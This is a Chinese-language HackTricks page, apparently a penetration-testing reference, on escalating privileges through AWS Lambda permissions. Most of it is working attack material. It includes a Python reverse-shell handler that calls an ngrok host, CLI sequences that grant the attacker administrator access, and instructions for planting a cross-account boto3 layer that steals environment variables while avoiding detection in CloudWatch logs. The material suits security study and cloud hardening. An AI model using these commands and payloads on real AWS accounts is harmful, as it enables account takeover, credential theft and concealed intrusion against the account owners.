# AWS - Lambda特权升级

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## lambda

有关lambda的更多信息，请参见：

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`，`lambda:CreateFunction`，(`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

具有**`iam:PassRole`，`lambda:CreateFunction`**和**`lambda:InvokeFunction`**权限的用户可以通过将现有IAM角色传递给新的Lambda函数来**提升特权**，该函数包括导入相关AWS库到他们选择的编程语言的代码，然后使用它执行他们选择的操作。然后，可以通过AWS API调用函数来运行代码。

攻击者可以滥用此功能来获取**反向shell并窃取令牌**：

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
您还可以从Lambda函数本身滥用Lambda角色权限。如果Lambda角色具有足够的权限，您可以使用它来授予您管理员权限：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**潜在影响：**直接升级到指定的任意Lambda服务角色。

{% hint style="danger" %}
请注意，即使**`lambda:InvokeAsync`**看起来很有趣，但它本身并不能执行**`aws lambda invoke-async`**命令，您还需要`lambda:InvokeFunction`权限。
{% endhint %}

### `iam:PassRole`，`lambda:CreateFunction`，`lambda:AddPermission`

与之前的情况类似，如果您拥有**`lambda:AddPermission`**权限，您可以通过它来授予自己**`lambda:InvokeFunction`**权限。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在影响：**直接提升到指定的任意Lambda服务角色。

### `iam:PassRole`，`lambda:CreateFunction`，`lambda:CreateEventSourceMapping`

一个拥有**`iam:PassRole`，`lambda:CreateFunction`和`lambda:CreateEventSourceMapping`**（可能还有`dynamodb:PutItem`和`dynamodb:CreateTable`）权限，但**没有**`lambda:InvokeFunction`权限的用户，可以通过**将现有IAM角色传递给新的Lambda函数**来提升权限，该函数包含导入相关AWS库到他们选择的编程语言的代码，然后使用它执行他们选择的操作。然后，他们需要**创建一个DynamoDB表或使用现有表**，为Lambda函数创建一个指向该DynamoDB表的事件源映射。然后，他们需要将一个项目放入表中，或者等待另一种方法来执行此操作，以便**触发Lambda函数**。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
在python文件中，代码将利用目标角色。一个例子是使用前面方法中相同的脚本。

接下来的步骤取决于当前AWS环境中是否使用DynamoDB。如果使用了DynamoDB，只需要为Lambda函数创建事件源映射；但如果没有使用，则攻击者需要使用以下命令创建一个启用了流式传输的表：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
在这个命令之后，攻击者将通过以下命令**创建一个事件源映射**，来**连接Lambda函数和DynamoDB表**：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
现在，Lambda函数和流已经连接起来，攻击者可以通过触发DynamoDB流来调用Lambda函数。可以通过将项目放入DynamoDB表中来触发流，使用以下命令完成：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
在这一点上，Lambda函数将被调用，攻击者将成为AWS账户的管理员。

**潜在影响：**直接提升到指定的Lambda服务角色。

### `lambda:AddPermission`

拥有此权限的攻击者可以**授予自己（或他人）任何权限**（这将生成基于资源的策略以授予对资源的访问权限）：

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在影响：**通过授予修改代码和运行代码的权限，直接提升到lambda服务角色。

### `lambda:AddLayerVersionPermission`

拥有此权限的攻击者可以**授予自己（或他人）`lambda:GetLayerVersion`权限**。他可以访问该层并搜索漏洞或敏感信息。

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**潜在影响：**可能访问敏感信息。

### `lambda:UpdateFunctionCode`

拥有 **`lambda:UpdateFunctionCode`** 权限的攻击者可以使用该权限**更新附有 IAM 角色的现有 Lambda 函数的代码**，以便在该编程语言中导入相关的 AWS 库并使用它代表该角色执行操作。然后，如果攻击者无法直接调用该函数，他们需要**等待它被调用**，但如果该函数已经存在，很可能有某种方式会调用它。
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
当相关的**.zip文件包含使用Lambda角色的代码**时。一个例子可以包括先前方法中的代码片段。

**潜在影响：**直接提升到使用的lambda服务角色。

### `lambda:UpdateFunctionConfiguration`

#### 介绍

[**Lambda层**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)允许在lambda函数中包含**代码**，但将其**分开存储**，因此函数代码可以保持较小，**多个函数可以共享代码**。

在lambda中，您可以使用以下函数检查加载python代码的路径：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
以下是位置：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

例如，库boto3从`/var/runtime/boto3`（第4个位置）加载。

#### 利用

**将层附加到函数**只需要`lambda:UpdateFunctionConfiguration`权限，**层可以在不同账户之间共享**。我们还需要知道**他们正在使用哪些库**，以便我们可以正确地覆盖它们，但在这个例子中，我们将**假设被攻击的函数正在导入boto3**。

为了安全起见，我们将使用Pip安装与我们目标函数相同版本的boto3库（Python 3.7），以确保目标函数中没有任何可能引起问题的差异。该运行时目前使用的是boto3版本1.9.42。

使用以下代码，我们将boto3版本1.9.42及其依赖项安装到本地的"lambda\_layer"文件夹中：
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
接下来，我们将打开`/lambda_layer/boto3/__init__.py`并添加恶意代码。我们要添加的有效载荷如下所示：

![](<../../../.gitbook/assets/image (26).png>)

`requests`是从`botocore`中导入的。该函数将窃取环境变量，并且try-except和0.1秒的超时是为了确保此代码不会破坏任何东西。

{% hint style="info" %}
**重要提示：**在真正的渗透测试中，您不应再使用`from botocore.vendored import requests`，因为这将在该函数的CloudWatch日志中打印“DeprecationWarning”，这可能导致您被防御者发现。
{% endhint %}

现在，将该代码打包成一个**ZIP文件**并**上传**到攻击者账户中的**新Lambda层**。您需要首先创建一个“python”文件夹，并将您的库放在其中，以便一旦我们将其上传到Lambda，代码将在“/opt/python/boto3”中找到。此外，请确保该层与Python 3.7兼容，并且**该层与我们的目标函数位于同一区域**。完成后，我们将使用`lambda:AddLayerVersionPermission`来**使该层公开可访问**，以便我们的目标账户可以使用它。在此API调用中使用您的个人AWS凭据。
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
现在我们拥有被入侵的凭证，我们将在目标Lambda函数“s3-getter”上运行以下命令，这将附加我们的跨账户Lambda层。
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
下一步要么是我们自己**调用函数**（如果我们可以的话），要么等待它被正常方式调用——这是更安全的方法。

在以下位置可以找到一种**更隐蔽的利用此漏洞的方法**：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在影响：**直接提升到使用的Lambda服务角色。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

也许有了这些权限，您可以创建一个函数并通过调用URL来执行它...但我找不到测试的方法，所以如果您找到了，请告诉我！

### Lambda中间人攻击

一些Lambda函数将从用户的参数中**接收敏感信息**。如果在其中一个函数中获得了RCE，您可以窃取其他用户发送给它的信息，请在以下位置检查：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的动态 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
